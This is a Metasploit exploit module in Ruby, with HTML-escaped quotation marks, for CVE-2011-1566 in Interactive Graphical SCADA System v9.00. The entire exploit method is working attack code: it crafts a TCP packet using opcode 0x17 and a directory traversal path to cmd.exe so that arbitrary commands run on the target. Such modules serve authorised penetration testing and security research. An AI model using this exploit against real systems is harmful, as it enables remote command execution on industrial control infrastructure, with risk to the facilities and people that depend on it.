# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Interactive Graphical SCADA System Remote Command Injection&#039;,
      &#039;Description&#039;    => %q{
          This module abuses a directory traversal flaw in Interactive
        Graphical SCADA System v9.00. In conjunction with the traversal
        flaw, if opcode 0x17 is sent to the dc.exe process, an attacker
        may be able to execute arbitrary system commands.
      },
      &#039;Author&#039;         =>
        [
          &#039;Luigi Auriemma&#039;,
          &#039;MC&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2011-1566&#039;],
          [ &#039;OSVDB&#039;, &#039;72349&#039;],
          [ &#039;URL&#039;, &#039;http://aluigi.org/adv/igss_8-adv.txt&#039; ],
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 153,
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Mar 21 2011&#039;))

    register_options(
      [
        Opt::RPORT(12397)
      ], self.class)
  end

  def exploit

    print_status("Sending exploit packet...")

    connect

    packet =  [0x00000100].pack(&#039;V&#039;) + [0x00000000].pack(&#039;V&#039;)
    packet << [0x00000100].pack(&#039;V&#039;) + [0x00000017].pack(&#039;V&#039;)
    packet << [0x00000000].pack(&#039;V&#039;) + [0x00000000].pack(&#039;V&#039;)
    packet << [0x00000000].pack(&#039;V&#039;) + [0x00000000].pack(&#039;V&#039;)
    packet << [0x00000000].pack(&#039;V&#039;) + [0x00000000].pack(&#039;V&#039;)
    packet << [0x00000000].pack(&#039;V&#039;)
    packet << "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
    packet << "windows\\system32\\cmd.exe\" /c #{payload.encoded}"
    packet << "\x00" * (143) #

    sock.put(packet)
    sock.get_once(-1,0.5)
    disconnect

  end

end

